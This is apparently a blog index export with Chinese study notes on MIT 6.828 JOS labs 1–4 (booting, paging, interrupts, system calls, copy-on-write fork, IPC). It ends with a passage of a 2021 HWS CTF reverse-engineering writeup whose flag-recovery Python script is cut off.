先调用sys_page_map将父子进程的同一虚拟内存地址映射到同一物理页，并且此时子进程对应虚拟内存权限为COW。接下来将调用sys_page_map将父进程自身重新映射一遍，这步是为了修改父进程虚拟内存权限为COW。 pgfault 这是fork中被注册成_pgfault_handler的函数。大致工作流程为：将PFTEMP映射到一个新的物理页；我们把缺页中断所在页地址记作fault_va，然后将fault_va那一页数据拷贝到PFTEMP处；最后调用sys_page_map将fault_va映射到本进程PFTEMP对应的物理页，并设置权限为可写。由此可以看出做的工作是利用PFTEMP作为暂存数据的内存空间，实现了fault_va映射物理页的替换。 设置子进程_pgfault_upcall，由于子进程与父进程共用内存空间，因此不需要再设置_pgfault_handler 3. 进程间通信 时钟中断 在第一部分的初始化工作中我们提到了用lapic来定时产生时钟中断，接下来这部分就要利用lapic产生的时钟中断实现CPU的时分复用了。 实现思路是为用户态进程的eflags寄存器设置FL_IF标志代表启用时钟中断，并在trapentry和trap_dispatch函数中添加对时钟中断的处理。具体来说就是当用户态进程接收到时钟中断时，会陷入内核把当前正处于RUNNING状态的任务改为RUNNABLE，然后调用lapic_eoi和sched_yield调度另一个合适的任务来执行。这样保证了每个任务都是按照分到的时间片来执行，没有哪个任务能够一直霸占CPU，时间片大小就是lapic产生时钟中断的间隔。最后要注意的一点，lapic_eoi的功能是向lapic发送接收到时钟中断的响应，因为x86架构CPU只有接收到响应才会产生下一个时钟中断。 进程间信息的发送与接收 接收信息 进程通过系统调用sys_ipc_recv进入内核态，将进程对应的env中的env_ipc_receving标志位设为真表示处于接收信息状态，随后将自身进程状态改为ENV_NOT_RUNNABLE并调度另一个新任务。只有等到某个进程向它发送数据并将其状态改回ENV_RUNNABLE，它才有可能被CPU执行。 发送信息 这部分系统调用比较繁琐，大多是一些差错检查，若是发送方与接收方的虚拟内存地址都合法，则发送方虚拟内存地址对应的物理页会与接收方的虚拟内存地址建立映射关系，与sys_page_map的实现类似，否则就不映射物理页。无论是否映射物理页，最终都要把接收者的env_ipc_receving设置为假，env_ipc_from设置为自身的进程id，env_ipc_value设置成要发送的数据，env_status设置为ENV_RUNNABLE，且最重要的是要将接收方进程trapframe中的eax寄存器设为0来模拟正常返回用户态的情况。 一个小坑 在实现IPC时我发现即使设置了trapframe的eax为0，但用户态得到的返回值却为12，也就是sys_ipc_recv的调用号。一度困扰了我很久，最后发现问题出在env_run函数中，我们的sys_ipc_recv在设置了自身为NOT_RUNNABLE之后，又会因为env_run切换进程时设置回RUNNABLE。导致还没等到进程发送信息给它，它自身又运行起来最终没收到任何信息地返回了用户态，当然eax寄存器也是保持着调用时的原样为12。至此我明白了lab3中对env_run实现的提示，原来指的是还需要考虑当前进程为NOT_RUNNABLE的状态。 4. question &amp; code这部分的内容欢迎dalao斧正。 Compare kern/mpentry.S side by side with boot/boot.S. Bearing in mind that kern/mpentry.S is compiled and linked to run above KERNBASE just like everything else in the kernel, what is the purpose of macro MPBOOTPHYS? Why is it necessary in kern/mpentry.S but not in boot/boot.S? In other words, what could go wrong if it were omitted in kern/mpentry.S? Hint: recall the differences between the link address and the load address that we have discussed in Lab 1. 因为mpentry.S中的指令及数据会被加载到MPENTRY_PADDR处再执行，因此相关数据的绝对地址要修改成加载后的地址，只需要将这些数据的偏移量加上MPENTRY_PADDR即可。如果没有MPBOOTPHYS，而是直接用它们在mpentry.S中的地址会导致访问不可用内存的错误。boot.S的加载地址与编译链接后的地址相同，所以不需要计算偏移与加载基址相加。 It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock. 因为这把锁在最后调用env_pop_tf回到用户态前必须要释放，这意味着可能会有多个CPU同时执行env_pop_tf。如果所有CPU使用同一个栈空间，那么env_pop_tf所使用的参数会遭到破坏。 In your implementation of env_run() you should have called lcr3(). Before and after the call to lcr3(), your code makes references (at least it should) to the variable e, the argument to env_run. Upon loading the %cr3 register, the addressing context used by the MMU is instantly changed. But a virtual address (namely e) has meaning relative to a given address context–the address context specifies the physical address to which the virtual address maps. Why can the pointer e be dereferenced both before and after the addressing switch? 因为envs是在mem_init中由boot_alloc分配出来的，位于内核的虚拟内存空间，内核虚拟地址与物理地址的转换方式固定为+-0xf0000000，这对于任何进程的页表来说都是如此，换言之任何页表0xf0000000之后的虚拟内存空间映射的都是相同的物理页，所以e的使用不受切换页表的影响。 Whenever the kernel switches from one environment to another, it must ensure the old environment’s registers are saved so they can be restored properly later. Why? Where does this happen? 因为转换到新的环境之后，新的进程会按照指令修改寄存器中的值，如果不保存转换之前寄存器的值，那么这些数据就永远地丢失了。保存寄存器值到trapframe中的操作在trapentry.S的_alltraps中完成，这是所有类型的中断都会执行的一段指令。 https://github.com/veltavid/mit-6.828-jos-study/tree/lab4","tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT-6.828-JOS-lab3实验笔记","date":"2021-08-17T01:10:05.000Z","path":"2021/08a277b212.html","text":"1. 进程环境建立第一部分的主要工作是将用户态执行的程序装载到内存中。为了与内核态区别开来，我们首先需要一种数据结构来管理用户态进程的相关环境信息，也就是Env结构体。在本部分中，我们初始化了一个env_free_list用于存储多个用户进程的环境信息，但在本实验中一次只会装载并执行一个用户程序。 Env映射的物理页由page_alloc分配，但这一步分配是在初始化env_free_list时就完成了的。真正要分配Env时内核所做的工作其实只是对env_free_list指向的Env进行初始化，并将其解下。 初始化时需要注意将内核中已建立的二级页表也拷贝给进程的二级页表，否则在从内核态转移至用户态时会发生page fault，但此时还未设置好异常处理，所以最终引发的是triple fault。这是因为在更改cr3为用户进程的二级页表后，还需要继续执行内核中的一系列pop指令并设置eip为用户程序的入口才能真正地转换到用户态，若用户进程页表中没有内核虚拟地址的相关映射关系，自然会发生page fault。初始化完二级页表后，还要将Env中各段寄存器的值设置成用户态地址空间的段选择子，最后从env_free_list上解下完成分配。 准备好了描述进程的Env，我们可以着手将硬盘上的二进制文件装载到内存中，这一步需要解析elf文件格式，分段映射到不同的物理页上。在映射时需要注意，我们存储映射关系的页表是用户进程所有的，而非内核的，因此我们需要更改cr3使当前生效的二级页表变为用户进程的，在映射完毕后再更改回内核的。映射完elf文件，还需要继续分配内存给用户栈，这样用户进程的内存布局才算完整了。最后将Env中用于上下文切换的Trapframe中的eip设置为程序入口点，这样内核才能正确地移交控制权。 2. 异常与中断处理在上一部分中，我们实现了从内核态到用户态的转换。这一部分，我们要做的则是从用户态转换到内核态，相比于高权限到低权限，由低权限到高权限无疑要更加复杂。在操作系统中，这种转换只能通过中断完成，中断又分为外部中断与内部中断，外部中断主要是操作系统内核与外部设备通信的一种方式，在本实验中不会遇到；内部中断可进一步细分为软中断和异常，软中断是软件自己主动发起的中断，如int3、int80等，异常则是CPU内部执行时遇到错误发出的中断。我们接下来要实现的是内部中断的处理，由于软中断与异常的处理基本一致，我们接下来不对二者进行区分。 中断处理的基础数据结构是IDT(中断描述符表)，其中存储的描述符称为门。门描述符可分为中断门描述符，陷阱门描述符，任务门描述符和调用门描述符，后两者在实际应用中比较少见，因此可以忽略。前两个的区别主要在于中断门会将eflags寄存器IF位置0来屏蔽其他中断避免中断嵌套，而后者不会置0，其余的构成二者是一致的，都有段描述符选择子，段内偏移量和门描述符权限等。 因此我们在初始化idt时就要根据上述门描述符的结构来为每种中断设置好门描述符权限，和中断处理程序的偏移，段描述符选择子则统一为内核的代码段。中断处理程序的函数调用流程为trapEntry-&gt;trap-&gt;trap_dispatch，真正根据中断号执行不同异常处理的函数为trap_dispatch。trapEntry负责传递中断号，并根据不同中断是否带有error code来决定是否需要自行调整来保证各中断的栈帧结构相同，最后是保存用户态上下文环境。注意这个trapEntry对于每个中断来说是不同的，为了方便统一称为trapEntry。以下是各中断是否带有error code的情况。 image-20210728165240665 trap则负责检查中断是否来自用户态，从而决定执行完中断处理后如何返回。 3. 系统调用系统调用也是通过软中断实现的，因此处理方式与第二部分相同，我们实现系统调用只需要在idt中多加一项代表系统调用的门描述符即可，向其中存入系统调用trapEntry的地址。在trap_dispatch中提取用户通过寄存器传递的参数，然后将这些参数传递给真正根据系统调用号来提供不同功能的函数syscall。在执行不同系统调用对应得函数时，需要注意检查用户传递的参数，若为内存则必须进行权限的判断，以防止用户越权读写内存导致不可预料的后果。用户是否具有权限可通过页表中对应索引处存储的物理地址后12位来判断。这个判断还有另一个好处，若用户请求访问的内存是未映射的，那么就肯定不具有权限，从根本上保证了用户态的page fault不会导致内核态中发生page fault，换言之内核态中一旦发生page fault一定是不可修复的，系统应当直接panic。 4. question &amp; code关于这部分的内容欢迎dalao斧正。 What is the purpose of having an individual handler function for each exception/interrupt? (i.e., if all exceptions/interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?) 不同的handler可以传递不同的中断号，若所有中断都由同一个trapEntry进入到内核态则内核中无法确定是哪一种中断。此外由于不同中断是否带有error code的情况也不一样，若是都使用一个trapEntry，传递给内核的Trapframe长度随中断不同也可能会不同。 Did you have to do anything to make the user/softint program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but softint‘s code says int $14. Why should this produce interrupt vector 13? What happens if the kernel actually allows softint‘s int $14 instruction to invoke the kernel’s page fault handler (which is interrupt vector 14)? 因为门描述符的权限控制，由用户态进程主动引发的中断权限只有3，而page fault的门描述符权限要求为0，不符合权限就转变成了general protection fault。若内核允许用户态主动引发page fault，那么用户可以间接地控制物理页的分配。 The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to SETGATE from trap_init). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault? 这个问题的原因也是门描述的权限设置不正确导致的，int3是用户态进程主动引发的，权限只有3，若int3的门描述符权限设置为比3小的数就会变成general protection fault。因此将门描述符权限设置为3就能够正常的触发int3中断处理。 What do you think is the point of these mechanisms, particularly in light of what the user/softint test program does? 门描述符的权限设置至关重要，若是权限设置错误轻则无法正常处理中断，重则导致用户越权。 编译相关问题 发现使用gcc-8编译会导致所有测试都过不去，问题出在kern_pgdir初始化上，memset清空kern_pgdir后，发现kern_pgdir变量本身也变为了0。ida看了一下kernel发现end居然在kern_pgdir前，不知道为啥。只能把在end后的变量都赋一个初始值，免得被放到bss段。 https://github.com/veltavid/mit-6.828-jos-study/tree/lab3","tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT-6.828-JOS-lab2实验笔记","date":"2021-08-17T01:10:01.000Z","path":"2021/087fe16b97.html","text":"1. Physical Page Management这部分完成的是物理页初始化及其管理的相关函数。 static void * boot_alloc() 这是在物理页管理数组初始化前用于物理内存分配的函数。实现方式也很朴素，获取装载到内存中的内核最高的未使用的虚拟地址，将其按页对齐后得到起始地址，从这个地址往后以页为单位进行内存分配。 void page_init() 这个函数会初始化boot_alloc分配得到的物理页管理数组。大多数的物理页都应该被描述成空闲状态并且被插入到空闲链表中。一些需要保留的物理页如下所述： 第一个物理页，这是为了保护BIOS和实模式下的IDT等相关数据。 从0x0A0000开始到0x100000的物理页，这片384KB大小的空间留给操作系统I/O使用。 加载内核的物理页。 内核之后的由boot_alloc分配给页表目录和物理页管理数组的物理页。 struct PageInfo * page_alloc(int alloc_flags) 这个函数是在物理页管理数组初始化完成后真正用来分配物理内存的函数，此时不应再使用boot_alloc()。它会从非空的空闲链表中取下一个物理页分配出去，并根据alloc_flags中alloc_zero的设置与否来决定是否清空该物理页的数据。 void page_free(struct PageInfo *pp) 这个函数先检查被释放的物理页是否引用计数已经为0，若不为0说明还在使用中不能被释放；还需判断link域是否为0，若不为0则说明已经在空闲链表中，其出现double free现象应当报错。通过检测的物理页就被插入到空闲链表中。 2. Virtual Memory这部分实现的是对二级页表进行操作的函数。 pte_t * pgdir_walk(pde_t *pgdir, const void *va, int create) pgdir是页表目录，va是待查找的虚拟地址，create决定当va所在页表未分配时是否分配。该函数就是根据va的高10位找到它所在页表的索引，然后从页表目录中取出来，若不存在且create为真就调用page_alloc将该页表映射到一个物理页。拿到页表后再根据va的中间10位得到其在页表内部的索引，由索引及页表得到指向va映射物理页的指针。 在本函数中若是分配了新的页表，将其对应的物理地址存到页表目录中，并且需要设置可访问、可写、用户可用的权限标志。 struct PageInfo * page_lookup(pde_t *pgdir, void *va, pte_t **pte_store) 该函数用于寻找va映射的物理页，并将其所在页表中的对应指针存储到pte_store中。后一个操作是为了方便page_remove移除page之后置空，因此其他调用page_lookup的函数不应传递pte_store。 void page_remove(pde_t *pgdir, void *va) 该函数利用page_lookup找到va映射的物理页，将其引用计数减一，当引用计数为0时就使用page_free释放该物理页。随后利用pte_store指针将va对应页表的相应索引处置空。最后需要注意的是每次成功移除一个物理页都要刷新TLB，TLB是一个高速缓存，用于加快内存转换的速度，刷新是为了清除TLB中被remove的物理页对应表项。 int page_insert(pde_t *pgdir, struct PageInfo *pp, void *va, int perm) 该函数要将va映射的物理页改为pp，因此先page_remove掉原先的物理页。注意当原先物理页与pp相同时，这样的操作可能会导致映射的物理页也存在于空闲链表上，因此要在page_remove前就增加pp的引用计数。然后将pgdir_walk找到的指向va映射物理页的指针改为指向pp对应物理地址，同时权限在perm的基础上还要增加可访问的权限。 static void boot_map_region(pde_t *pgdir, uintptr_t va, size_t size, physaddr_t pa, int perm) 该函数的作用是将[va,va+size)映射到[pa,pa+size)，其中va，pa，size都为物理页大小的整数倍。实现方式就是不断地调用pgdir_walk获取指向va映射物理页的指针，将其指向改为pa即可，同时注意权限在perm的基础上还要增加可访问的权限。这个函数主要是为了方便下一部分中内核相关内存区域的映射。 3. Kernel Address Space这部分完成的是内核相关的一些内存区域的映射。 物理页管理相关数据结构的映射 我们在第一部分中建立的物理页管理数组pages是负责描述各物理页状态的数据结构，既然它也是内存中的数据那么也需要映射到物理地址。由于内核虚拟地址与物理地址的转换就是加减内核基址，我们可以直接用boot_map_region建立这样的映射，通过这个虚拟地址访问的权限设置成仅内核可读可写。为了使用户也能够获取pages中的数据，我们还要将pages拷贝的虚拟地址也映射到内核中这块物理地址上，只是拷贝的虚拟地址访问时只能够读取，无法写入。通过逻辑上使用2块内存空间可以有效地区分内核与用户的权限，但实际上使用的是同一块物理内存，因此也没有浪费内存空间。 内核栈的映射 内核栈的虚拟地址空间有1024个页大小，但实际上只有最高的8个页被映射到了物理页，低的那些作为屏障将内核栈与其他内存空间隔离开，避免栈在降低时写坏了其他内存中有用的数据。 内核本身的映射 将内核加载基址之后的所有虚拟内存都映射到从0开始的物理地址。这是我们所有操作的大前提：内核虚拟地址与其映射的物理地址转换是通过加减内核加载基址实现的。这个前提是通过装载一个静态设置的临时页表实现的。 4. 总体流程内核通过mem_init函数将以上3部分的初始化及检查串联起来。下面是mem_init的大致流程。 mem_init 其中装载页表目录是通过设置cr3寄存器实现的，启用分页功能则是设置cr0寄存器中对应标志位。 5. question &amp; code关于这部分的内容欢迎dalao斧正。 Assuming that the following JOS kernel code is correct, what type should variable x have, uintptr_t or physaddr_t? 1234mystery_t x;char* value = return_a_pointer();*value = 10;x = (mystery_t) value; 应当为uintptr_t。因为开启了分页功能之后，都是在虚拟内存上读写。 What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible: Entry Base Virtual Address Points to (logically): 1023 0xFFC00000 Page table for top 4MB of phys memory 1022 0xFF800000 Page table for top second 4MB of phys memory x x&lt;&lt;22 ? 4 0x01000000 Page table for bottom fifth 4MB of phys memory 3 0x00C00000 Page table for bottom fourth 4MB of phys memory 2 0x00800000 Page table for bottom third 4MB of phys memory 1 0x00400000 Page table for bottom second 4MB of phys memory 0 0x00000000 [see next question] We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernel’s memory? What specific mechanisms protect the kernel memory? 因为页表中不仅存储了虚拟内存地址映射的物理页，还存储了虚拟内存的权限。我们在映射kernel内存到物理页时，设置的权限都是用户不可读不可写。CPU在使用我们提供的页表进行地址转换时还会检查操作是否符合权限要求，这是在CPU硬件支持下才能实现的保护机制。 What is the maximum amount of physical memory that this operating system can support? Why? 4GB。单张页表能够映射4MB物理内存，扩展到二级页表能支持的最大物理内存就是1024*4MB，即4GB。 How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down? 4+4+4KB*(1024+1)+8*(4GB/4KB)+8 其实就是下面这些数据结构占用的内存空间。 实际上的开销不会像上述计算出的那么大，”4KB*(1024+1)”这部分一般要更小，因为只有当页表目录中的每项都分配了一张页表的时候才会达到这个开销，而很少有程序会用到这么多内存。 Revisit the page table setup in kern/entry.S and kern/entrypgdir.c. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary? 当执行完jmp eax后就开始执行KERNBASE之上的内存了。 因为装载的页表事先写入了映射关系，它将从0x00000000开始的以及0xf0000000开始的4MB虚拟内存都映射到了从0x00000000开始的4MB物理内存。 这是因为操作系统的惯例就是将kernel放到高地址，我们必须要跳转到高地址继续执行kernel。此外这个页表是临时的，在它的帮助下我们会建立正式的页表，在正式页表中0x00000000开始的4MB虚拟内存不一定会映射到0x00000000开始的4MB物理内存。 https://github.com/veltavid/mit-6.828-jos-study/tree/lab2","tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT-6.828-JOS-lab1实验笔记","date":"2021-08-17T01:09:38.000Z","path":"2021/08c22b0759.html","text":"1. 启动过程 BIOS BIOS由qemu模拟，它会初始化中断描述符表，查找并启动设备，当BIOS找到可启动的磁盘后，它会将磁盘中位于第一个扇区的bootloader装载到内存中，其装载地址是固定的，随后控制权被移交给bootloader。 bootloader bootloader源码在boot文件夹下。bootloader在启动时会被BIOS装载到物理地址0x7c00，它所做的事有： 开启A20地址线，防止高位地址被清零。 设置好GDTR寄存器，并将模式从实模式切换到保护模式。 使用ljmp设置cs为内核代码段选择子，再设置各个段寄存器为内核数据段选择子。 使用I/O汇编指令读取磁盘上第二个扇区中存储的内核文件。 通过内核文件的header信息来装载内核文件的不同segement。 最后跳转到内核的入口点，将控制权移交给内核。 实模式与保护模式 实模式 从上述启动过程中我们能够看出CPU在刚启动时是处于实模式的，所谓实模式就是32位CPU的16位运行模式，它的存在意义是为了兼容过去的16位CPU，因此在实模式下CPU会尽量模拟成与过去16位CPU相同的样子。主要的特点有： 寄存器都只使用低16位。 程序中使用的地址都是真实的物理地址。 寻址空间大小为1MB，如果段基址加偏移的结果超出了这个范围就会回卷。 没有内核态与用户态之分。 实模式下A20是关闭的，任何地址高于20位的部分会被清零，因此bootloader将CPU从实模式转换到保护模式前才需要先将A20设置为1。 保护模式 保护模式下CPU中的各个寄存器都能使用32位，段寄存器中程序可控的部分只有低16位，这被称为段选择子，它的结构如下图所示 使用段选择子中的索引可以在GDT中找到对应段描述符，从段描述符中获取段基址，段属性，段限长字段存入段寄存器的高80位。之后计算地址时使用段基址加上段内偏移计算出线性地址，linux段描述符的段基址都为0，所以计算出的线性地址与偏移地址相同。 kernel 从bootmain函数中可以看出内核会被装载到从0x10000开始的物理内存，但为什么说kernel被加载的物理地址是0x100000呢。查看一下kernel的头部结构就能够解答这个疑问了。 从图上可以看出kernel共有3个program header，第一个program header的装载物理地址为0x100000。 通常为了区分user内存与kernel内存，kernel应该被放到高地址处。在JOS中kernel的基地址为0xf0100000，但物理内存并没有这么多，实际上这块只是虚拟内存，它是由0x100000映射过去的，这种映射CPU已经提供了硬件支持，我们只需要为CPU提供一张页表即可实现，本实验中已经提供给我们了一张静态的页表，因此我们暂时不需要考虑物理页的分配问题——这是下一个实验的工作。 2. code cprintf补全 程序缺少%o格式化符的实现，仿照%d补全如下，将base改为8即可。 12345678case 'o': num = getint(&amp;ap, lflag); if ((long long) num &lt; 0) &#123; putch('-', putdat); num = -(long long) num; &#125; base = 8; goto number; backtrace实现 打印ebp，eip及参数 随意定义一个变量，根据其地址算出ebp及存储返回地址与参数的栈上地址，按格式循环打印出来，根据entry.S可知当ebp为0时即可停止。 1234567891011121314151617181920212223242526272829intmon_backtrace(int argc, char **argv, struct Trapframe *tf)&#123; int temp=0; uint32_t ebp,eip,arg1,arg2,arg3,arg4,arg5; ebp=((uint32_t)&amp;temp)+0x1c; eip=((uint32_t)&amp;temp)+0x20; arg1=((uint32_t)&amp;temp)+0x24; arg2=((uint32_t)&amp;temp)+0x28; arg3=((uint32_t)&amp;temp)+0x2c; arg4=((uint32_t)&amp;temp)+0x30; arg5=((uint32_t)&amp;temp)+0x34; cprintf(\"Stack backtrace:\\n\"); while(1) &#123; cprintf(\" ebp %08x eip %08x args %08x %08x %08x %08x %08x\\n\",ebp,get32(eip),get32(arg1),get32(arg2),get32(arg3),\\ get32(arg4),get32(arg5)); if(!get32(ebp)) break; ebp=(uint32_t)get32(ebp); eip=ebp+4; arg1=ebp+8; arg2=ebp+0xc; arg3=ebp+0x10; arg4=ebp+0x14; arg5=ebp+0x18; &#125; return 0;&#125; 打印debug信息 通过debuginfo_eip函数可以获得地址所属于哪个函数，以及源文件名。但debuginfo_eip中获取源文件行数需要我们自己实现。查看stabs文档可以知道N_SLINE类型的stab中存储了我们需要的行数，在n_desc域中。 因此使用stab_binsearch找到类型为N_SLINE的stab，然后将它的n_desc域赋值给info的eip_line域即可。 12stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr);info-&gt;eip_line=stabs[lfun].n_desc; 最终版backtrace 1234567891011121314151617181920212223242526272829303132333435363738intmon_backtrace(int argc, char **argv, struct Trapframe *tf)&#123; int temp=0; uint32_t ebp,eip,arg1,arg2,arg3,arg4,arg5; struct Eipdebuginfo info; char func_name[64]; int func_line; ebp=((uint32_t)&amp;temp)+0x1c; eip=((uint32_t)&amp;temp)+0x20; arg1=((uint32_t)&amp;temp)+0x24; arg2=((uint32_t)&amp;temp)+0x28; arg3=((uint32_t)&amp;temp)+0x2c; arg4=((uint32_t)&amp;temp)+0x30; arg5=((uint32_t)&amp;temp)+0x34; cprintf(\"Stack backtrace:\\n\"); while(1) &#123; debuginfo_eip((uintptr_t)get32(eip), &amp;info); func_line=(uint32_t)get32(eip)-(uint32_t)info.eip_fn_addr+1; strncpy(func_name,info.eip_fn_name,info.eip_fn_namelen); *(func_name+info.eip_fn_namelen)='\\0'; cprintf(\" ebp %08x eip %08x args %08x %08x %08x %08x %08x\\n\",ebp,get32(eip),get32(arg1),get32(arg2),get32(arg3),\\ get32(arg4),get32(arg5)); cprintf(\" %s:%d: %s+%d\\n\",info.eip_file,info.eip_line,func_name,func_line); if(!get32(ebp)) break; ebp=(uint32_t)get32(ebp); eip=ebp+4; arg1=ebp+8; arg2=ebp+0xc; arg3=ebp+0x10; arg4=ebp+0x14; arg5=ebp+0x18; &#125; return 0;&#125; 3. question &amp; code关于这部分的内容欢迎dalao斧正。 At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode? 在ljmp后。ljmp会根据段选择子将GDT中对应的段描述符存储到cs段寄存器中，从而改变段基址。由于段描述符中的段基址为0，所以实际上是进入了平坦模式，直接根据偏移量跳转到了32位汇编指令区域。 What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded? 最后一条指令是call dword ptr ds:10018h，0x10000是装载kernel头部信息的地方，偏移0x18处存储着kernel的入口点。kernel执行的第一条指令是mov large word ptr ds:472h, 1234h。 Where is the first instruction of the kernel? 0x10000c。 How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information? 每个segment中包含的sector数目由program header结构体中的p_memsz字段决定，只需要用p_memsz除以单个sector的大小就可以知道要读取多少个sector。 Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.) 因为BIOS将控制权交给bootloader时内核还未加载，所以在0x100000处的数据应当为0。而bootloader将控制权移交给内核时，已经在0x100000处加载了内核，所以此时该处存有内核数据。 Explain the interface between printf.c and console.c. Specifically, what function does console.c export? How is this function used by printf.c? printf.c调用console.c提供的cputchar函数实现单个字符的输出。console.c导出的函数为cputchar。printf.c将调用cputchar的putch作为打印单个字符的功能函数传给了printfmt.c中的vprintfmt。 Explain the following from console.c 12345671 if (crt_pos &gt;= CRT_SIZE) &#123;2 int i;3 memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));4 for (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)5 crt_buf[i] = 0x0700 | ' ';6 crt_pos -= CRT_COLS;7 &#125; 当窗口中显示的字符已经满了但还需要打印新的字符时，会整体向上移一行，空出最下面一行来打印新的字符。 For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC’s calling convention on the x86. Trace the execution of the following code step-by-step: 12int x = 1, y = 3, z = 4;cprintf(\"x %d, y %x, z %d\\n\", x, y, z); In the call to cprintf(), to what does fmt point? To what does ap point? fmt参数指向”x %d, y %x, z %d\\n”字符串。ap指向栈上存储的cprintf第二个参数，即1。 List (in order of execution) each call to cons_putc, va_arg, and vcprintf. For cons_putc, list its argument as well. For va_arg, list what ap points to before and after the call. For vcprintf list the values of its two arguments. vcprintf-&gt;cons_putc-&gt;va_arg。 在va_arg前ap指向1，va_arg之后ap指向3。 fmt的值为”x %d, y %x, z %d\\n”字符串地址，ap的值为ebp+0xc。 Run the following code. 12unsigned int i = 0x00646c72;cprintf(\"H%x Wo%s\", 57616, &amp;i); What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. Here’s an ASCII table that maps bytes to characters. The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set i to in order to yield the same output? Would you need to change 57616 to a different value? 输出是”HE110 World”。H输出，57616以16进制输出是E110，” Wo”也是直接输出的，i被当作字符串输出，由于x86是小端序，因此0x00646c72在内存中实际上是72 6c 64 00这样存储的，即rld\\x00。 若为大端序则i应该等于0x726c6400，而57616不需要改变。 In the following code, what is going to be printed after ‘y=’? (note: the answer is not a specific value.) Why does this happen? 1cprintf(\"x=%d y=%d\", 3); 会将ebp+0xc处的4字节数据当作整数打印出来，因为格式化字符串中有第二个’%’，而用户只传入了一个参数，但va_arg无法判断变参列表的结尾，会把后续并非参数的数据当作参数打印出来。这也被称为格式化字符串漏洞。 Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change cprintf or its interface so that it would still be possible to pass it a variable number of arguments? vprintfmt中反向遍历格式化字符串，将格式化输出的中间结果暂存在一个足够大的字符数组中，当格式化字符串到了它的起始位置时就输出这个中间结果。 https://github.com/veltavid/mit-6.828-jos-study/tree/lab1","tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"2021HWS初赛writeup","date":"2021-08-16T01:21:52.000Z","path":"2021/0811c4c4be.html","text":"年初打的一场比赛，拿了第8名，把当时写的wp放到博客上来。 reverse1.decrypt主要逻辑就是一个加密，看起来没法逆，但因为加密逻辑简单所以可以自己写一个加密程序逐字节爆破出flag。 1234567891011121314151617181920212223242526result=b\"\\x12\\x45\\x10\\x47\\x19\\x49\\x49\\x49\\x1A\\x4F\\x1C\\x1E\\x52\\x66\\x1D\\x52\\x66\\x67\\x68\\x67\\x65\\x6F\\x5F\\x59\\x58\\x5E\\x6D\\x70\\xA1\\x6E\\x70\\xA3\"map=[]for i in range(256): map.append(i)flag=\"\"for i in range(32): sign=0 for v5 in map: v4=i origin=v5 v3 = 2 * (v4 &amp; v5) v5 ^= v4 v4 = v3 while(v3): v3 = 2 * (v4 &amp; v5) v5 ^= v4 v4 = v3 r=v5^0x23 if(r==result[i]): flag=flag+chr(origin) print(chr(origin),end=\"\") sign=1 breakprint(\"\")print(len(flag)) 2.obfu是一个混淆了的加密程序，先将输入的字符串转换成对应的字节，然后将前一字节的低3比特与本字节的高5比特组合成新的字节存入新的数组v12中。接下来会通过一些步骤生成之后加密所需的参数，由于与输入无关所以可以直接动调得到。生成参数的前16字节作为rc4的密钥对v12加密，然后是一个AES解密，密钥与rc4的相同，最后与参数的后16字节异或得到最终结果，将这个结果与密文比较，这个密文也可以通过动调得到。最后把结果输入程序即会生成一个flag.txt文件。 1234567891011121314151617181920212223from Crypto.Cipher import AEStrue_result=\"\\x21\\x23\\x2F\\x29\\x7A\\x57\\xA5\\xA7\\x43\\x89\\x4A\\x0E\\x4A\\x80\\x1F\\xC3\"v7=\"\\x6E\\xD6\\xCE\\x61\\xBB\\x8F\\xB7\\xF3\\x10\\xB7\\x70\\x45\\x9E\\xFC\\xE1\\xB1\"plain_text=[0 for i in range(16)]for i in range(16): plain_text[i]=ord(true_result[i])^ord(v7[i])shared_key=b\"\\x8C\\xE5\\x1F\\x93\\x50\\xF4\\x45\\x11\\xA8\\x54\\xE1\\xB5\\xF0\\xA3\\xFB\\xCA\"plain_text=bytes(plain_text)cipher=AES.new(shared_key,AES.MODE_ECB)cipher_text=cipher.encrypt(plain_text)rc4_decrypted=b\"\\x2c\\xa7\\x73\\x0e\\x86\\x3c\\xb4\\x5f\\x8f\\x87\\xae\\x91\\xf7\\x40\\x11\\x0d\"#通过c语言写的rc4解密脚本得到result=\"\"for i in range(1,17): temp1=(rc4_decrypted[(i+1)%16]&amp;0xe0)&gt;&gt;5 